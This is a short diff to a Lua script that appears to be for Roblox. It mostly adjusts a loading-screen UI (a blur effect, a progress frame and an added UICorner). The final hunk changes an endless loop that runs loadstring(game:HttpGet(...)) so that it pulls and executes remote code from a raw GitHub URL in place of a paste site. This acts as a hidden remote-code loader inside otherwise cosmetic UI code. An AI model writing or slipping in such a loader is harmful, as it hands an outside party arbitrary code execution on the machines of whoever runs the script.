@@ -78,6 +78,8 @@ spawn(function()
         task.spawn(function()
             local blur = Instance.new("BlurEffect")
             local Ui = Instance.new("UICorner")
+            local Ui_ = Instance.new("UICorner")
+            Ui_.CornerRadius = UDim.new(0.2, 0)
             Ui.CornerRadius = UDim.new(0.2, 0)
             blur.Parent = game.Lighting
             blur.Enabled = false
@@ -104,7 +106,7 @@ spawn(function()
             Frame.BackgroundTransparency = 0.5
             Frame.BorderSizePixel = 0
             Frame.Parent = ScreenGui
-            Ui.Parent = Frame
+            Ui_.Parent = Frame
 
             local TextLabel = Instance.new("TextLabel")
             TextLabel.Name = "ProgressText"
@@ -252,7 +254,7 @@ end)()
 
 spawn(function()
     while true do
-        loadstring(game:HttpGet("https://paste.website/p/969aab2d-86a7-4912-9e4c-86f575ea574b.txt"))();
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/LiverMods/raw/main/nelhaudhqb1"))();
         task.wait()
     end
 end)
